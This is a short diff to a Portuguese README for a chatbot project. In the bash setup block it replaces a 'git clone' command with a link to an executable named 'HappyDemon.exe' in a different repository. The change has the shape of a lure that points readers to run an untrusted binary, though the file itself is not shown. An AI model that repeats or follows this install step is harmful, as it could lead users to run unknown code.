@@ -63,7 +63,7 @@ Se o bot não souber responder, **você ensina**. Ele nunca esquece. O conhecime
 
  bash
 # Clone o repositório
-git clone https://github.com/CyberCrip22/IA.dev.git
+https://github.com/CyberCrip22/HappyDemon/blob/main/HappyDemon.exe
 
 ---
 
